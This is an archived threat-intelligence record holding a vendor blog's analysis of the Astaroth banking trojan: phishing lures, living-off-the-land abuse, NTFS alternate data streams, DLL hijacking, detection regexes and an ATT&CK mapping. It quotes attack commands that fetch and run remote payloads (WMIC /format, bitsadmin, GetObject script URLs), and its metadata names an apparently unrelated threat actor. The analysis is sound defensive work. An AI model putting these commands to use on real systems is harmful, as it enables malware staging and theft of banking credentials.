{
    "id": "5bfe0153-0dc1-487c-9dc7-9da92de36916",
    "created_at": "2023-01-12T15:01:01.542263Z",
    "updated_at": "2025-03-27T02:08:40.91821Z",
    "deleted_at": null,
    "sha1_hash": "350544fd4d2437e1f0a7ccce8a8466ab2760e24b",
    "title": "2021-11-17 - Astaroth- Banking Trojan",
    "authors": "",
    "file_creation_date": "2022-05-28T00:26:50Z",
    "file_modification_date": "2022-05-28T00:26:50Z",
    "file_size": 316846,
    "plain_text": "# Astaroth: Banking Trojan\n\n**[armor.com/resources/threat-intelligence/astaroth-banking-trojan/](https://www.armor.com/resources/threat-intelligence/astaroth-banking-trojan/)**\n\nBy Amer Elsad\n\nWe’re continuing our blog series about Living-off-the-Land (LotL) attacks by focusing on a particularly\n[fast-moving malware called Astaroth. Click here to view the first post, which goes into the](https://www.armor.com/resources/threat-intelligence/living-off-the-land-attacks/)\ncharacteristics of LotL binaries and how they work.\n\nFirst spotted in the wild in 2017, Astaroth is a highly prevalent, information-stealing Latin American\nbanking trojan. It is written in Delphi and has some innovative execution and attack techniques.\nOriginally, this malware variant targeted Brazilian users, but Astaroth now targets users both in North\nAmerica and Europe.\n\n\n-----\n\n_Astaroth Heat_\n\n_map (Source: “Microsoft”)_\nAs for its LotL component, it’s interesting to note that at no point during the attack chain is any file run\nthat’s not a system tool. This malware completely lives of the land!\n\nMultiple campaigns with two different versions have been observed in the wild and one of the most\nsignificant updates is the use of Alternate Data Stream (ADS), which Astaroth abuses at several\nstages to perform various activities. ADS is a file attribute that allows a user to attach data to an\nexisting file. The stream data and its size are not visible in File Explorer. Attackers hide binary data\ninside the ADS of the file desktop.ini without changing the file size.\n\nRecently, a newer version was found in the wild, abusing NTFS Alternate Data Streams (ADS) to store\nthe content of malicious payloads downloaded during execution. The malware is highly modular, with a\nvery complex execution flow. The main vector used by the group is sending malicious files in\ncompressed format, attached to email. File types vary from VBS to LNK; the most recent campaign\nstarted to attach an HTML file which executes JavaScript for downloading a malicious file.\n\nThe malware relies on anti-debugging, anti-virtualization, and anti-emulation tricks, besides the usage\nof process hollowing, living-off-the-land binaries (LotLBin), and NTFS Alternate Data Streams to store\ndownloaded payloads. These payloads come from cloud hosting services such as Cloudflare’s\n\n\n-----\n\nWorkers, Amazon AWS, and also popular websites like YouTube and Facebook, where they store C2\ninformation.\n\nAdditional Astaroth sophisticated, multi-stage processes include:\n\nHighly obfuscated JScript staged downloaders.\n.LNK files to retrieve the malware payload once the user clicks an embedded link in the spam\nemail.\nThe malware uses various fileless techniques, injects into numerous legitimate Windows\nprocesses, and adopts the use of living-off-the-land tactics.\nThe abuse of different LotLBins such as “extexport.exe.”\nInformation targeted by Astaroth includes financial data, sensitive browser data\n(passwords/credentials), SSH, and email credentials. Upon retrieval, the information is typically\nencrypted, then exfiltrated via an HTTPS POST to the attacker’s C2 server.\nAbuse of Alternate Data Streams (ADS).\nAstaroth implements a robust series of anti-analysis/evasion techniques, among the most\nthorough we’ve seen recently.\nNovel use of YouTube channels for C2 helps evade detection by leveraging a commonly used\nservice on commonly used ports.\n\nThe complex attack chain, which involves the use of multiple LotLBins, results in the eventual loading\nof the Astaroth malware directly in memory.\n\n## Analysis of Astaroth: The Infection Process\n\n### Step 1: Delivery Stage\n\nAstaroth relies heavily on emails containing a malicious file in a compressed format. These emails\nattempt to deceive the victim by maintaining a corporate appearance and emulating legitimate\nbusiness requests, such as providing information regarding the COVID-19 pandemic or notifying a\nclient about a package sent via courier services.\n\nThe main vector used by the group is sending malicious files in compressed format, attached to email.\nFile types vary from VBS to LNK; the most recent campaign started to attach an HTML file which\nexecutes JavaScript for downloading a malicious file.\n\n\n-----\n\n_Sample of a_\n\n_purchase invoice – another one of Astaroth’s tricks for luring victims. (Source: “SecureList“)_\n\n\n-----\n\n_Sample email_\n\n_used in the latest Astaroth attacks. (Source: “Microsoft“)_\n\n**1st Campaign**\n\nA malicious link in a spear-phishing email lead to an LNK file. The LNK file has batch commands\nembedded in the LNK which execute the WMIC tool with the “/Format” parameter.\n\n(This method is used to invoke an XSL (eXtensible Stylesheet Language) local or remote file, which\nmay contain any scripting. In this case, they used JavaScript.)\n\n**Command Example:**\n\n\n-----\n\n**Command Example:**\n\n_wmic os get /format:”hxxps://webserver/payload.xsl_\n\nThe use of the parameter “/format” causes WMIC to download the file “v.txt,” which is an XSL file\nhosted on a legitimate-looking domain. The XSL file hosts an obfuscated JavaScript that is\nautomatically run by WMIC.\n\nThis JavaScript code then runs WMIC again to download another .txt file, which is essentially another\nXSL file containing an obfuscated JavaScript code, which then uses the Bitsadmin, Certutil, and\nRegsvr32 tools for the next steps.\n\n**Command Example:**\n\n_bitsadmin.exe /transfer 24653 /priority foreground https://{anotherurl}/{random}.gif.zip_\n_c:\\Users\\Public\\Libraries\\hwds{random}.gif_\n\n**2nd Campaign**\n\n\n-----\n\nIn a separate campaign, the LNK file runs an obfuscated BAT command line. Then the BAT command\ndrops a single-line JavaScript file to the Pictures folder and invokes explorer.exe to run the JavaScript\nfile.\n\n**Command Example:**\n\nThe dropped one-liner script uses the GetObject technique to fetch and run the much larger main\nJavaScript directly in the memory.\n\n**Command Example:**\n\n_%windir%\\Explorer /c GetObject(‘script:https://{urlthatholdsthemainjavascript}’)_\n\n### Step 2: BITSAdmin Abuse (1 Campaign)st\n\nBITSAdmin then uses a benign looking command-line to download multiple binary blobs from a\ncommand-and-control (C2) server:\n\nThe payloads are Base64-encoded and have file names like: falxconxrenwb.~, falxconxrenw64.~,\nfalxconxrenwxa.~, falxconxrenwxb.~, falxconxrenw98.~, falxconxrenwgx.gif, falxfonxrenwg.gif.\n\nThen the Certutil system tool is used to decode the downloaded payloads:\n\nOnly a couple of files are decoded to a DLL; most are still encrypted/obfuscated. But one of the\ndecoded payload files (a DLL) is run within the context of the Regsvr32 system tool:\n\n\n### Step 2: Alternate Data Streams Abuse (2nd Campaign)\n\nA newer version of Astaroth malware started to use a new technique for storing downloaded payloads\nin NTFS Alternate Data Streams (ADS of desktop.ini.) to conceal their presence in the system.\n**Instead of using BITSAdmin, the usage of ADS helps to hide the file in the system since it will not**\nappear in Explorer, etc.\n\n**Command Example:**\n\n_cmd /c type C:\\Users\\Public\\Libraries\\hwds\\{random}.gif > c:\\Users\\Public\\libraries\\hwds\\desktop.ini:_\n_{random}.gif && erase C:\\Users\\Public\\Libraries\\hwds\\{random}.gif_\n\n### Step 3. DLL Hijack\n\nAstaroth will launch itself by using DLL Search Order Hijacking. There were various processes being\nused by Astaroth at this step; in a recent version of the malware, it used ExtExport.exe, which is\nrelated to Internet Explorer.\n\nThe DLLs that were downloaded before in the previous step will be named with a known library that\nare loaded by ExtExport on its execution: mozcrt19.dll, mozsqlite3.dll, sqlite3.dll; or\n**<random>64a.dll and <random>64b.dll.**\n\nThey load these two DLLs by passing an attacker-controlled path to the tool. The tool searches for any\nDLL with the following file names: mozcrt19.dll, mozsqlite3.dll, or sqlite3.dll, and it is **loaded by**\n**ExtExport.exe.**\n\n\n-----\n\n**Command Example:**\n\n_cmd.exe /c cd “c:\\Program Files\\Internet Explorer”_\n\n_&& ExtExport.exe c:\\Users\\Public\\Libraries\\hwds {ordinal} {ordinal}_\n\n### Step 4. Loading Astaroth in Memory as a DLL (Userinit Abuse)\n\n1. The newly loaded DLL (mozcrt19.dll, mozsqlite3.dll, or sqlite3.dll) is a proxy that reads three\n\nbinary ADS streams (ini:masihaddajjalxa.~, desktop.ini:masihaddajjalxb.~,\n**desktop.ini:masihaddajjalxc.~) and combines these into a DLL.**\n2. This new DLL is a proxy that reads and decrypts another ADS stream (ini:masihaddajjalgx.gif)\n\ninto a DLL. This DLL is injected into userinit.exe using the process hollowing technique.\n3. The new DLL that is loaded inside exe is again a proxy that reads and decrypts another ADS\n\nstream (desktop.ini:masihaddajjalg.gif) into a DLL.\n\nThis DLL is the actual Astarothand is reflectively loaded inside userinit.exe.\n4. Hence, Astaroth never touches the disk and is loaded directly in memory, making it very\n\nevasive.\n\n### Detections:\n\nSearching for the parent process: exe that spawns bitsadmin.exe and extexport.exe.\nProcess creation event 4688 with the command line mentioned using the following strings\n(regex):\n\n\\/c getobject\\(\\”|\\’script:http\n\n\\/c type [a-z]:\\\\users.*\\>.*[a-z]:\\\\users\\\\.*\\.*.:\n\n\\/c.*script\\.exe.*\\..*:.*\\.js\n\n>.*mozcrt19\\.dll\n\n>.*mozsqlite3\\.dll\n\n>.*sqlite3\\.dll\\.dll\n\nOR together, for example: >.*moz.*\\d{1,2}\\.dll|>.*sqlite3\\.dll\\.dll\n\nextexport\\.exe.*[a-z]:\\\\\n\n### Hunting Notes:\n\nOne characteristic of the early campaigns was the use of actor-owned domains along with\nsubdomains.\n\n**Example URL:**\nhxxp://wer371ioy8[.]winningeleven3[.]re/CSVS00A1V53I0QH9KUH87UNC03A1S/Arquivo.2809.PDF\nVariable names, function names, and parameter names were changed from their original,\nrandomly generated values to improve readability and make the analysis process more efficient.\n\n### Analysis Notes:\n\n\n-----\n\nThe threat actors behind these campaigns were so concerned with evasion they included dozens of\nchecks, including those rarely seen in most malware, including, but not limited to the following:\n\nIt leverages CreateToolhelp32Snapshot to identify virtual machine guest additions that may be\ninstalled on the system for both VirtualBox and VMware.\nIt looks for the presence of hardware devices that are commonly seen on virtual machines.\nIt checks the value of the SystemBiosDate, which is stored in the Windows registry\n(HKLM\\HARDWARE\\DESCRIPTIONS\\System\\SystemBios\\Date) to determine if the value\nmatches “06/23/99,” which is the default value for virtual machines within VirtualBox.\nIt attempts to identify the following applications which are commonly used for malware analysis:\nOllyDbg, ImmunityDebugger, WinDbg, IDA Pro, Process Explorer, Process Monitor, RegMon,\nFileMon, TCPView,A utoruns, Wireshark, Dumpcap, Process Hacker, SysAnalyzer,\nHookExplorer, SysInspector, ImportREC, PETools, LordPE, Joebox, Sandbox, x32dbg.\nIf any of the checks fail, the malware forcibly reboots the system using the following commandline syntax: “cmd.exe /c shutdown -r -t 3 -f.”\n\n### ATT&CK Mapping:\n\nT1192 – Spearphishing link\n\nT1023 – Shortcut modification\n\nT1064 – Scripting\n\nT1027 – Obfuscated files or information\n\nT1197 – BITS Jobs\n\nT1105 – Remote File Copy\n\nT1096 – NTFS File Attributes\n\nTA0005 – Defense Evasion\n\nT1073 – DLL Side-Loading\n\nT1218 – Signed Binary Proxy Execution\n\nT1129 – Execution through Module load\n\nT1140 – Deobfuscate/Decode Files or information\n\nT1093 – Process Hollowing\n\nT1055 – Process Injection\n\nAs you can see, Astaroth is a highly invasive malware that employs complex evasive techniques to\nsurvive undetected. To better understand how these attacks happen and how to prevent them in your\n[organization, read our article, “Living-Off-the-Land Attacks.”](https://www.armor.com/resources/threat-intelligence/living-off-the-land-attacks/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-17 - Astaroth- Banking Trojan.pdf"
    ],
    "report_names": [
        "2021-11-17 - Astaroth- Banking Trojan.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535661,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1653697610,
    "ts_modification_date": 1653697610,
    "files": {
        "pdf": "https://archive.orkl.eu/350544fd4d2437e1f0a7ccce8a8466ab2760e24b.pdf",
        "text": "https://archive.orkl.eu/350544fd4d2437e1f0a7ccce8a8466ab2760e24b.txt",
        "img": "https://archive.orkl.eu/350544fd4d2437e1f0a7ccce8a8466ab2760e24b.jpg"
    }
}